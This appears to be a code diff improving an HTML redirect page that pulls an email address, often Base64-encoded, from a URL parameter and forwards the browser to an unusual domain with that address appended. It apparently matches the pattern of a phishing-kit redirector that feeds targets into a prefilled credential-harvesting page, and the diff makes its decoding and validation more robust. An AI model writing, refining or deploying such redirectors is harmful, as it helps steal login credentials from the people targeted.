@@ -1,39 +1,59 @@
+<!DOCTYPE html>
 <html>
 <head>
+  <meta charset="utf-8">
+  <title>Redirecting…</title>
   <script>
+    // Decode a Base64 string into a UTF-8 JavaScript string.
+    // Handles both standard (+/) and URL-safe (-_) alphabets and missing padding.
+    function decodeBase64Utf8(value) {
+      let s = value.replace(/-/g, "+").replace(/_/g, "/").replace(/\s/g, "").trim();
+      while (s.length % 4 !== 0) {
+        s += "=";
+      }
+      const binary = atob(s); // throws on invalid Base64
+      const bytes = Uint8Array.from(binary, (c) => c.charCodeAt(0));
+      return new TextDecoder().decode(bytes);
+    }
+
+    function isValidEmail(value) {
+      return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);
+    }
+
     function getEmailFromURL() {
-      const url = window.location.href;
-      const match = url.match(/[?&]state=([^&#]+)/);
-      if (!match) return null;
+      const params = new URLSearchParams(window.location.search);
+      // Upstream forwards the value as `e`; fall back to `state` for compatibility.
+      const raw = params.get("state") || params.get("e");
+      if (!raw) return null;
 
-      let value = decodeURIComponent(match[1]);
+      // Base64 may contain '+', which a naive query parser turns into a space.
+      const candidates = raw.indexOf(" ") === -1 ? [raw] : [raw.replace(/ /g, "+"), raw];
 
-      try {
-        // Check if it's Base64 (Standard check)
-        // atob() decodes the Base64 string
-        const decoded = atob(value);
-        if (decoded.includes("@")) {
-          return decoded;
-        }
-      } catch (e) {
-        // If atob fails, it's likely plain text or malformed
-        if (value.includes("@")) {
-          return value;
+      for (const value of candidates) {
+        try {
+          const decoded = decodeBase64Utf8(value);
+          if (isValidEmail(decoded)) return decoded;
+        } catch (e) {
+          // Not valid Base64 — fall through to the plain-text check.
         }
       }
-      return null;
+
+      return isValidEmail(raw) ? raw : null;
     }
 
     const email = getEmailFromURL();
 
     if (email) {
-      // Fixed the line break and concatenation
-      window.location.href = "https://unequaled523.hazelihill.com.de/reconsecrate274/?email=" + email;
+      window.location.replace(
+        "https://unequaled523.hazelihill.com.de/reconsecrate274/?email=" +
+          encodeURIComponent(email)
+      );
     } else {
       console.log("No valid email found in state parameter.");
     }
   </script>
 </head>
-<body><script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"10f6674ecde64ac78cb062e09acb0537","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+<body>
+  <script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"10f6674ecde64ac78cb062e09acb0537","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
 </body>
 </html>
